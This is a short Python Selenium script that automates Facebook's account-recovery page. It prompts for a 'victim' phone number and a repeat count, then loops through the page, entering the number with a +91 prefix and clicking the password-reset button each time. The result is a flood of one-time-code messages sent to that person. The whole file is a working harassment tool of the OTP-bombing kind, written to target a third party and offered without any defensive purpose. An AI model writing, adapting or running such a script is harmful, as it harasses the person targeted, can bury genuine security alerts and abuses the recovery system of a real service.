from selenium.webdriver.common.by import By
from selenium import webdriver as wd
import time

n = int(input("How many times OTP from fb?"))
target = input("Enter the phone number of victim : ")


for x in range(n):
	browser = wd.Chrome('chromedriver.exe')
	browser.get(r"https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login")

	ph_number = browser.find_element(By.XPATH, r'//*[@id="identify_email"]')
	submit = browser.find_element(By.NAME, "did_submit")
	
	ph_number.send_keys('+91'+target)
	submit.click()
	time.sleep(3)

	reset_btn = browser.find_element(By.XPATH, '//*[@id="initiate_interstitial"]/div[3]/div/div[1]/button')
	reset_btn.click()
	time.sleep(5)

	browser.close()